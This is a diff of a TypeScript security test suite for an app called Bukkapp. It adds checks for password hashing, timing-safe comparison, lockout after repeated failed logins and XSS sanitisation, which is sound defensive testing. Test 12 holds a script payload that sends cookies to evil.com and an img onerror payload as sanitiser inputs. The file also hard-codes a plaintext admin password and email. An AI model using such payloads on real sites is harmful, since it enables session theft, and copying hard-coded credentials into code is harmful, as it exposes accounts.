@@ -18,7 +18,7 @@ function assert(condition: boolean, testName: string) {
   }
 }
 
-export function runAdversarialSecurityTests() {
+export async function runAdversarialSecurityTests() {
   console.log('====================================================');
   console.log('BUKKAPP ADVERSARIAL SECURITY & ATTACK SIMULATION');
   console.log('====================================================\n');
@@ -113,6 +113,65 @@ export function runAdversarialSecurityTests() {
   );
   assert(log.actorUserId === 'usr-admin-1' && !!log.createdAt, 'Immutable audit record successfully sealed');
 
+  // 8. CRYPTOGRAPHIC PASSWORD HASHING & SALT UNIQUENESS
+  console.log('\n--- 8. CRYPTOGRAPHIC PASSWORD HASHING & SALT ENTROPY ---');
+  const { hashPassword, verifyPassword, timingSafeEqual, PRE_HASHED_SEEDS } = await import('../lib/security/crypto');
+  const hash1 = await hashPassword('BukkappAdmin0926');
+  const hash2 = await hashPassword('BukkappAdmin0926');
+  assert(hash1 !== hash2, 'Salt uniqueness: identical passwords produce distinct cryptographic hashes');
+  assert(hash1.startsWith('pbkdf2$sha256$100000$'), 'OWASP PBKDF2-HMAC-SHA-256 standard enforced with 100k iterations');
+  assert(await verifyPassword('BukkappAdmin0926', hash1), 'Password verification authenticates valid candidate');
+  assert(await verifyPassword('BukkappAdmin0926', hash2), 'Second salted hash authenticates valid candidate');
+  assert(!(await verifyPassword('WrongPassword', hash1)), 'Password verification strictly rejects invalid candidate');
+  assert(await verifyPassword('BukkappAdmin0926', PRE_HASHED_SEEDS.ADMIN_HASH), 'Pre-seeded Admin cryptographic hash verified');
+
+  // 9. CONSTANT-TIME TIMING ATTACK RESILIENCE
+  console.log('\n--- 9. TIMING ATTACK RESILIENCE ---');
+  const secretA = 'k98f2d8a1c5b4e72390146f8acb21849';
+  const secretB = 'k98f2d8a1c5b4e72390146f8acb21849';
+  const secretC = 'k98f2d8a1c5b4e72390146f8acb21840';
+  assert(timingSafeEqual(secretA, secretB), 'Constant-time equality matches identical keys');
+  assert(!timingSafeEqual(secretA, secretC), 'Constant-time equality rejects mismatching keys');
+
+  // 10. NO PLAINTEXT CREDENTIALS IN USER MODELS
+  console.log('\n--- 10. ZERO PLAINTEXT PASSWORDS IN SESSIONS & STORAGE ---');
+  const { authService, DEFAULT_ACCOUNTS } = await import('../lib/auth/authService');
+  DEFAULT_ACCOUNTS.forEach((acc) => {
+    assert(
+      acc.passwordHash.startsWith('pbkdf2$sha256$'),
+      `Account ${acc.email} is protected by PBKDF2 cryptographic hash`
+    );
+  });
+  const adminLoginRes = await authService.login('admin@bukkapp.in', 'BukkappAdmin0926');
+  assert(adminLoginRes.success && !!adminLoginRes.user, 'Admin login succeeds with hashed password');
+  assert(!('passwordHash' in (adminLoginRes.user as any)), 'User object returned to client strips passwordHash completely');
+
+  // 11. ANTI-BRUTE FORCE RATE LIMITING LOCKOUT
+  console.log('\n--- 11. ANTI-BRUTE FORCE RATE LIMITING LOCKOUT ---');
+  const { securityLimiter } = await import('../lib/security/rateLimiter');
+  const bruteKey = 'test_attack_key_' + Date.now();
+  for (let i = 1; i <= 4; i++) {
+    const res = securityLimiter.recordFailure(bruteKey, 5, 60000, 60000);
+    assert(res.allowed, `Attempt ${i} allowed with ${res.remainingAttempts} remaining`);
+  }
+  const lockoutRes = securityLimiter.recordFailure(bruteKey, 5, 60000, 60000);
+  assert(!lockoutRes.allowed, '5th failed attempt triggers immediate security lockout');
+  assert(lockoutRes.remainingAttempts === 0, 'Remaining attempts drop to 0 upon lockout');
+  const blockedCheck = securityLimiter.check(bruteKey, 5, 60000);
+  assert(!blockedCheck.allowed, 'Subsequent attempts actively blocked while lockout timer is running');
+
+  // 12. INPUT SANITIZATION & ANTI-XSS DEFENSE
+  console.log('\n--- 12. INPUT SANITIZATION & ANTI-XSS ENGINE ---');
+  const { sanitizeText, sanitizeSearchQuery } = await import('../lib/security/sanitize');
+  const maliciousInput = '<script>document.location="http://evil.com/cookie="+document.cookie</script>Salons';
+  const maliciousEvent = '<img src=x onerror=alert(document.domain)>Dentist';
+  const sanitizedInput = sanitizeText(maliciousInput);
+  const sanitizedEvent = sanitizeText(maliciousEvent);
+  assert(!sanitizedInput.includes('<script>'), 'Sanitizer completely eliminates <script> injection');
+  assert(!sanitizedEvent.includes('onerror='), 'Sanitizer strips malicious event handler attributes');
+  const searchClean = sanitizeSearchQuery('<script>evil()</script>pickeball rajpur');
+  assert(searchClean === 'pickeball rajpur', 'Search query sanitization disarms script injection while preserving keywords');
+
   console.log('\n====================================================');
   console.log(`ADVERSARIAL SECURITY RESULTS: ${passed} PASSED, ${failed} FAILED`);
   console.log('====================================================\n');
@@ -121,8 +180,9 @@ export function runAdversarialSecurityTests() {
 }
 
 if (require.main === module) {
-  const result = runAdversarialSecurityTests();
-  if (result.failed > 0) {
-    process.exit(1);
-  }
+  runAdversarialSecurityTests().then((res) => {
+    if (res.failed > 0) {
+      process.exit(1);
+    }
+  });
 }
